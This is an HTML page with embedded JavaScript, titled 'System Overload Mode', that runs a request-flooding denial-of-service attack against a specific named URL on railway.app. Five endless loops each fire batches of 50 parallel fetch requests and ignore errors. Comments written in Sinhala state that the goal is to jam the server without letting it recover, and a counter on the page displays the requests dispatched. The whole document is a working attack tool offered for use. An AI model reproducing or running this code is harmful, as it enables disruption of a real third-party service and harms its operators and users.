<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>⚡ System Overload Mode</title>
    <style>
        body { background: #050505; color: #ff0000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 10%; }
        .warning { border: 2px solid #ff0000; display: inline-block; padding: 20px; box-shadow: 0 0 20px #ff0000; }
        h1 { font-size: 3rem; margin: 0; }
        #count { font-size: 5rem; font-weight: bold; color: #fff; }
        .target { color: #aaa; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="warning">
        <h1>FORCE SENDING...</h1>
        <p class="target">Target: https://unity.up.railway.app/pair</p>
        <div id="count">0</div>
        <p>REQUESTS DISPATCHED</p>
    </div>

    <script>
        const target = "https://unity.up.railway.app/pair";
        let counter = 0;
        const display = document.getElementById('count');

        // එකවර ඉල්ලීම් විශාල ප්‍රමාණයක් යවන ප්‍රධාන function එක
        async function flood() {
            while (true) {
                // සර්වර් එක හිර කරන්න එකපාර Requests 50ක් (Parallel) යවනවා
                const batch = Array.from({ length: 50 }, () => 
                    fetch(target, { 
                        mode: 'no-cors',
                        cache: 'no-store',
                        referrerPolicy: 'no-referrer'
                    }).then(() => {
                        counter++;
                        if (counter % 10 === 0) display.innerText = counter.toLocaleString();
                    }).catch(() => {
                        // Error ආවත් දිගටම කරගෙන යනවා
                        counter++;
                    })
                );
                
                // සර්වර් එකට හුස්ම ගන්න ඉඩ නොදී දිගටම යැවීම
                await Promise.allSettled(batch);
            }
        }

        // වැඩේ පටන් ගන්න (Threads 5ක් එකපාර run කරනවා)
        for(let i=0; i<5; i++) {
            flood();
        }

    </script>
</body>
</html>
